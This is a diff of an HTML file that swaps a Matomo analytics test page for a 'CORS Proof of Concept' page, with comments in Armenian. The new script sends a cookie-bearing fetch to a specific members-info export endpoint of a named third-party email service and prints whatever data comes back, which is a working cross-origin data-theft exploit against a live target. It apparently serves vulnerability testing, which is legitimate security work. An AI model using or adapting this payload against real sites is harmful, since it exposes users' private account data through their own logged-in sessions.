@@ -1,72 +1,36 @@
 <!DOCTYPE html>
-<html lang="hy">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Matomo Verification Page</title>
-    
-    <!-- CSS Ստիլներ -->
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f6f8;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            text-align: center;
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
-
-    <!-- Matomo Code -->
-    <script>
-      var _paq = window._paq = window._paq || [];
-      /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
-      _paq.push(['trackPageView']);
-      _paq.push(['enableLinkTracking']);
-      (function() {
-        var u="https://abrdns.matomo.cloud/";
-        _paq.push(['setTrackerUrl', u+'matomo.php']);
-        _paq.push(['setSiteId', '1']);
-        var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-        g.async=true; g.src='https://cdn.matomo.cloud/abrdns.matomo.cloud/matomo.js'; s.parentNode.insertBefore(g,s);
-      })();
-    </script>
-    <!-- End Matomo Code -->
+    <title>CORS Proof of Concept</title>
 </head>
 <body>
+    <h2>CORS Vulnerability Test</h2>
+    <p>Տվյալների բեռնում...</p>
+    <pre id="output" style="background: #f4f4f4; padding: 10px;"></pre>
 
-    <div class="card">
-        <h1>Matomo Verification Test</h1>
-        <p>Այս էջը ստեղծված է Matomo-ի վերիֆիկացիան և թեստավորումն անցնելու համար։</p>
-        <button id="testBtn">Click to Test JS</button>
-    </div>
-
-    <!-- JS Կոդ -->
     <script>
-        document.getElementById('testBtn').addEventListener('click', function() {
-            alert('JavaScript-ը աշխատում է։');
+        // Այստեղ գրվում է թիրախային API-ի կամ էջի հասցեն, որտեղից ուզում եք կարդալ տվյալները
+        const targetUrl = "https://my.stripo.email/bapi/stripeapi/v3/companies/1800745/members-info-export";
+
+        fetch(targetUrl, {
+            method: "GET",
+            credentials: "include" // Ավելացվում է, եթե հարցումը պետք է ուղարկի նաև օգտատիրոջ Cookie-ները
+        })
+        .then(response => {
+            // Ստուգում ենք պատասխանի ստատուսը և վերցնում տեքստը
+            return response.text();
+        })
+        .then(data => {
+            // Եթե CORS-ը սխալ է կոնֆիգուրացված, այս կոդը կկարդա և էկրանին դուրս կբերի գաղտնի տվյալները
+            console.log("Հաջողվեց կարդալ տվյալները:", data);
+            document.getElementById("output").textContent = data;
+        })
+        .catch(error => {
+            // Եթե պաշտպանությունը աշխատում է, բրաուզերը կբլոկավորի և կտա CORS սխալ
+            console.error("CORS-ը բլոկավորեց հարցումը:", error);
+            document.getElementById("output").textContent = "CORS Policy blocked the request (Protected).";
         });
     </script>
-
 </body>
 </html>
